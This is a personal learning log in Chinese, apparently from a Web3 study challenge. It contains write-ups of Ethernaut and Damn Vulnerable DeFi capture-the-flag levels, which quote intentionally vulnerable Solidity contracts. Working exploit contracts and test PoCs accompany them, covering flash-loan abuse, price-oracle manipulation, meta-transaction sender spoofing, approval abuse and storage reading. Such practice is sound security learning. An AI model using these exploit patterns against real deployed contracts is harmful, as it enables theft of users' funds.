---
timezone: Asia/Shanghai 
---

# silver

1. 自我介绍 想多学习些web3知识

2. 你认为你会完成本次残酷学习吗？ 尽力

## Notes

<!-- Content_START -->

### 2024.08.29

Ethernaut 

#### fallout

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

要求成为合约的owner，看了代码只有一个函数有设置owner的功能：

```
  /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

虽然注释写了是构造函数，但是其实不是（是Fal1out而非Fallout），所以可以直接调用，就可以成为owner。

#### vault

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

可以看到虽然password是私有变量，但是可以通过读取对应位置的storage或查看合约部署时的inputdata得到password。密码存放在第二个插槽中：
```
await web3.eth.getStorageAt("0xC2205dfcB5Ef96C4357ad8CDe94e5348E1e33f3D",1)
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
```



### 2024.08.30

#### Ethernaut - Elevator

```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

如果要top返回true，就要islastfloor第一次返回false，第二次返回true。building合约是调用的msg.sender，所以我们构造一个合约，其islastfloor函数满足这个逻辑就好，输入的参数不重要。

```
contract MockBuilding {
    uint count=0;
    function isLastFloor(uint256 a) external returns (bool){
        if (count==0){
            count++;
            return false;
        }else{
            return true;
        }
    }
    function callElevator(address addr) external{
        Elevator(addr).goTo(0);
    }
}
```


### 2024.08.31

Ethernaut 
#### Shop

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) { //调用者的price>=100且从未buy过
            isSold = true;
            price = _buyer.price(); 
        }
    }
}
```

要求price<100

看起来类似电梯那个题目，但是buyer.price()是view的函数，不能更改状态。所以只能利用外部进行。发现isSold变量在两次调用price之间有更改。因此写合约利用这个isSold返回不同的bool值.

```
contract buyer{
    address shop =0xc3Ce8A0921980063AadA4cf475CA91C7e8E81a63;
    function price() external view returns (uint256){
        if (Shop(shop).isSold()==false){
            return 120;
        }else{
            return 0;
        }
    }
    function callshop()external{
        Shop(shop).buy();
    }
}
```



#### Force

这一关的目标是使合约的余额大于0

这个合约没有实现任何方法来接受以太。

但是可以通过合约自毁的方式，指定将余额转给Force合约。

POC:

```
pragma solidity ^0.8.0;

contract mine{
    constructor()payable {
    }

    function forcetransfer()public {
        selfdestruct(payable(0xcaa382a24236a3FB17A40367e4FC0961214B8cF3));
    }

}
```



#### King

要求成为king，阻止关卡重新声明王位


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

给大于prize的value，或作为owner就可以改变king

为了防止owner改变king，我们成为king之后，让这个transfer失败回滚.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract tobeking{

    receive() external payable {
        revert();
    }
    function start(address payable king)public payable{
         (bool success, ) = king.call{value:1000000000000000}("");
         require(success);
    }
}
```

不过要注意的是，不写receive函数也可以达到目的，即没法直接收款。另外，在转账的时候，必须用call，注意把address标记为payable。

### 2024.09.02
#### damnvulnerabledefi - Unstoppable

There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There’s a monitoring contract to check liveness of the flashloan feature.

Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans.

我们初始有10 token，要让闪电贷项目暂停，看监控合约代码可知，需要监控合约调用闪电贷时发生回滚：

```
function checkFlashLoan(uint256 amount) external onlyOwner {
        require(amount > 0);
        address asset = address(vault.asset());
        try vault.flashLoan(this, asset, amount, bytes("")) {
            emit FlashLoanStatus(true);
        } catch {//这里，如果回滚就会暂停
            emit FlashLoanStatus(false);
            vault.setPause(true);
            vault.transferOwnership(owner);
        }
    }
```

然后看flashLoan函数：

```
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0);
        if (address(asset) != _token) revert UnsupportedCurrency(); 
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // 这里，如果返回false则会回滚
        ......
}

    function convertToShares(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());// 一个是totalsuppy，一个是balance(this)，只要转账给合约即可，如：10*totalSupply/balance = 10*10eN/(10eN+1),
    }
```

测试：

```
    function test_unstoppable() public checkSolvedByPlayer {
        console.log(token.balanceOf(address(this)));
        token.transfer(address(vault), 1e18);
    }	
```

### 2024.09.03
#### native receiver

#### native-receiver

题目

```
There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.
```

要求将deployer的10weth和合约中的1000weth取出。

看了合约之后，发现有一个函数可疑：

```
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {//@audit 只有trustedForwarder调用且data长度大于20时，认为msg.sender为传入参数的最后20bytes
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
```

也就是只要msg.sender为trustedForwarder，合约的_msgSender可以由msg.data指定为任意地址（指定部署合约的owner为扣款地址）。

而存取款就用到了_msgSender():

```
    function withdraw(uint256 amount, address payable receiver) external {
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;
        weth.transfer(receiver, amount);
    }
```

因此可以实现给指定地址转账，并且扣款额度为msg.data。

BasicForwarder合约中提供了execute方法进行call操作，就可以转出合约里的1000WETH。

```
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
        _checkRequest(request, signature);

        nonces[request.from]++;

        uint256 gasLeft;
        uint256 value = request.value; // in wei
        address target = request.target;
        console.log("execute");
        console.logBytes(request.data);
        bytes memory payload = abi.encodePacked(request.data, request.from);//@audit 最后会+from，因此excute不能直接调用withdraw方法，否则最后msgsender会变成这个from，需要隔一层方法。
        //pool合约中还提供了一个muticall方法，进行delegatecall，当本合约调用那个方法时，既可以通过msg.sender的验证，也可以隔一层方法，让此处的from不在成为withdraw的参数。
         console.logBytes(payload);
        uint256 forwardGas = request.gas;
        assembly {
            success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don't copy returndata
            gasLeft := gas()
        }

        if (gasLeft < request.gas / 63) {
            assembly {
                invalid()
            }
        }
    }
```



除提取合约中存款以外，还有一点需要解决，即在receiver处还有10weth需要取出。

```
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (token != address(weth)) revert UnsupportedCurrency();

        weth.transfer(address(receiver), amount);
        totalDeposits -= amount;

        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        uint256 amountWithFee = amount + FIXED_FEE;
        weth.transferFrom(address(receiver), address(this), amountWithFee);
        totalDeposits += amountWithFee;

        deposits[feeReceiver] += FIXED_FEE;

        return true;
    }
```

观察发现：

（1）借贷/偿还的receiver是任意指定的，因此可以传入任何地址作为借贷者，使其借贷并转走其weth作为手续费

（2）手续费不是直接转到receiver地址的，而是转到pool合约中，记录到receiver名下。

因此可以通过这种方式，将receiver的钱转移到deposits数组记录的金额下，再转走。

看测试合约部署时，将deployer本身设为的receiver：

```
// Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
```

因此可以先通过闪电贷将这10weth转到deposits中（此时1010weth都记录在deposits[deployer]下，再通过BasicForwarder.execute调用withdraw转走。

POC：

```
   function test_naiveReceiver() public checkSolvedByPlayer {
        // address deployer = makeAddr("deployer");
        // address recovery = makeAddr("recovery");
        // address player;
        // uint256 playerPk;

        // NaiveReceiverPool pool;
        // WETH weth;
        // FlashLoanReceiver receiver;
        // BasicForwarder forwarder;

        for(uint i=0; i<10; i++){
            pool.flashLoan(receiver, address(weth), 0, "0x");
        }
        console.logUint(weth.balanceOf(address(pool))/1e18);
        console.logUint(pool.deposits(address(deployer))/1e18);//确认1010weth确实到pool
        bytes[] memory callDatas = new bytes[](1);
        callDatas[0] = abi.encodePacked(
            abi.encodeCall(NaiveReceiverPool.withdraw, (1010e18, payable(recovery))),
            abi.encode(deployer)
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            30000000,
            forwarder.nonces(player),
            callData,
            1 days
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        require(forwarder.execute(request, signature)); 
    }
```



### 2024.09.04

#### Truster

题目要求一个交易拿走所有token

```
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant//不能重入
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));
        token.transfer(borrower, amount);//
        target.functionCall(data);//调用任意指定合约

        if (token.balanceOf(address(this)) < balanceBefore) {//如果钱少了会回滚，因此中途不能转钱。所以让本合约去调用token的approve方法，结束flashloan之后再transferfrom
            revert RepayFailed();
        }

        return true;
    }
}
```

POC:

```
    function test_truster() public checkSolvedByPlayer {
        TrusterCaller t=new TrusterCaller();
        t.start(address(pool), recovery, address(token));
    }
```

```
contract TrusterCaller{
    function start(address pool, address rescue,address token)public{
        bytes memory data = abi.encodeCall(ERC20.approve,(address(this),1e24)); //1 million=6+18
        TrusterLenderPool(pool).flashLoan(0,address(this),token,data);
        DamnValuableToken(token).transferFrom(pool,rescue,1e24);
    }
}
```





#### side entrace

题目

```
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {//最后检查的时候，token需要在合约里，因此我们可以闪电贷取走所有钱之后deposit进去。通过检查后再取出。
            revert RepayFailed();
        }
    }
```

POC :

```
contract SideCaller{
    
    SideEntranceLenderPool pool;

    function start(address addr,address recovery)public{
        pool=SideEntranceLenderPool(addr);
        pool.flashLoan(1000e18);
        pool.withdraw();
        payable (recovery).transfer(1000e18);
    }
    function execute() external payable{
        pool.deposit{value:1000e18}();
    }
    receive()external payable{

    }
}
```
### 2024.09.05


#### puppet

题目：

```
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);//根据uniV1的价格计算所需抵押的ETH数目

        if (msg.value < depositRequired) {
            revert NotEnoughCollateral();
        }

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);//多余的eth转回
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if (!token.transfer(recipient, amount)) {//转账
            revert TransferFailed();
        }

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
        //借走1e5，要抵押 1e5/2* eth.balance(uni)/dvt.balance(uni)
        // = 1e5/2 * (10-9)/(10+y)
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}

```

POC:

contract CallPuppet{
    DamnValuableToken token;
    PuppetPool lendingPool;
    constructor(address dvt,address pp){
        token=DamnValuableToken(dvt);
        lendingPool=PuppetPool(pp);
    }

    function start(address recovery,address unipool)public payable{
        // payable(unipool).call{value:24*1e18}("");
        token.approve(unipool, 1e5*1e18);
        // token.transfer(address(lendingPool), token.balanceOf(address(this)));
        IUniswapV1Exchange(unipool).tokenToEthSwapInput(9e20, 1, block.timestamp+1 days);
        uint amount = lendingPool.calculateDepositRequired(1e5*1e18);
        console.logUint(amount);
        lendingPool.borrow{value:address(this).balance}(1e5*1e18,recovery);
    }
    receive()payable external{

    }
}


### 2024.09.06

#### puppet v2

一样的，使用了v2的reserve计算价格，可以向池内注入大量token拉低其价格。

poc：

```
    function test_puppetV2() public checkSolvedByPlayer {
        console.logAddress(address(weth));
        CallPuppet cp=new CallPuppet(address(token),address(lendingPool),address(uniswapV2Router),address(weth));
        token.transfer(address(cp), token.balanceOf(player));
        cp.start{value:20 ether}(recovery, address(uniswapV2Exchange));
    }
    
contract CallPuppet{
    DamnValuableToken token;
    PuppetV2Pool lendingPool;
    IUniswapV2Router02 router;
    WETH weth;
    constructor(address dvt,address pp,address r,address _weth){
        token=DamnValuableToken(dvt);
        lendingPool=PuppetV2Pool(pp);
        router=IUniswapV2Router02(r);
        weth=WETH(payable(_weth));
    }

    function start(address recovery,address unipool)public payable{

        token.approve(address(router),type(uint256).max);
        console.log(token.balanceOf(address(this)));
        address[] memory path=new address[](2);
        path[0]=address(token);
        path[1]=address(weth);
       
        router.swapExactTokensForETH(1e4*1e18, 0, path,address(this),block.timestamp+1 days);
        uint amount = lendingPool.calculateDepositOfWETHRequired(1e6*1e18);
        console.logUint(amount);
        uint256 depositValue = amount - weth.balanceOf(address(this));//差的weth去兑换补足
        weth.deposit{value:depositValue}();
        weth.approve(address(lendingPool), amount);
        lendingPool.borrow(1e6*1e18);
        token.transfer(recovery, token.balanceOf(address(this)));
    }
    receive()payable external{

    }
}
```

### 2024.09.07
#### privacy

题目

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true; //0
    uint256 public ID = block.timestamp;//1
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);//2
    bytes32[3] private data;//3,4,5,data[2]在slot 5

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

其中，下面的三个变量会存在同一个slot内，所以按顺序，data[2]是在slot 5。

    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);//2

所以：
```
await web3.eth.getStorageAt("0xd0173f719C91d8B53cb4e45758A18C0Bc007214a",5)
'0x8051fab8ce920ecc5ba128fd3edc66f02209821198cefc62f0c776dc3ff679f0'
```

知道key为0x8051fab8ce920ecc5ba128fd3edc66f0。


### 2024.09.09
#### Gatekeeper One

题目要求通过modifier中的判断条件，分析如下：

```
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);//使用合约
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);//此处剩余gas是8191整数倍
        _;
    }

    modifier gateThree(bytes8 _gateKey) {//XX1 XX2 XX3 XX4 XX5 XX6 XX7 XX8
        //xx5 xx6 xx7 xx8 = 00 00 xx7 xx8  =>  xx5 xx6 = 00 00 
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        //00 00 00 00 00 00 xx7 xx8 !=  xx1 xx2 xx3 xx4 00 00 xx7 xx8 =>  xx1 xx2 xx3 xx4 != 0
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        //00 00 xx7 xx8 == 00 00 3b 91  =>  xx7 xx8 == 3b 91
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        //=> xx xx xx xx 00 00 3b 91
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

因此key为：xx xx xx xx 00 00 3b 91

POC：

```
contract CallGateKeeper{
    uint256 public gas;
    function start(address keeper,bytes8 key)public{//0x1122334400003b91   0x112233440000ddC4
        bytes memory callData=abi.encodeCall(GatekeeperOne.enter,key);
         uint s=8191*3;
        while(true){
            (bool success,)=keeper.call{gas:s}(callData);
            if (success==true){
                gas=s;
                break;
            }
            s++;
        }
       
    }

}
```
### 2024.09.11
#### GateKeeper Two

题目及分析：
和上一道题一个系列的，要求符合modifier内的所有限制，具体分析见注释：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);//合约调用
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())//调用者为合约的同时，要求字节码长度为0 => 在构造函数中调
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
        //亦或运算，则key等于另外二者的亦或: x ^ key = 1111...1111 => key = x^ 1111...1111 
    }
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

POC:

```
contract callGateKeeper{
    constructor(address keeper){//在构造函数里调用，此时本地址的code还为空
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(type(uint64).max));
        GatekeeperTwo(keeper).enter(key);
    }
}
```

### 2024.09.12


#### NaughtCoin

题目以及分析：

要求绕过时间限制转出token

```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin';
    // string public constant symbol = '0x0';
    // uint public constant decimals = 18;
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {//transfer发起者为player的话，会有时间限制。可以通过给合约授权，调用transferfrom
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}

```

POC：

```
contract getNaughtCoin{
    //1.token.approve() 这一步我直接从remix调了
    //2.start()
    function start(address token)public{
        NaughtCoin(token).transferFrom(msg.sender,address(this),NaughtCoin(token).balanceOf(msg.sender));
    }
}
```


### 2024.09.13

<!-- Content_END -->
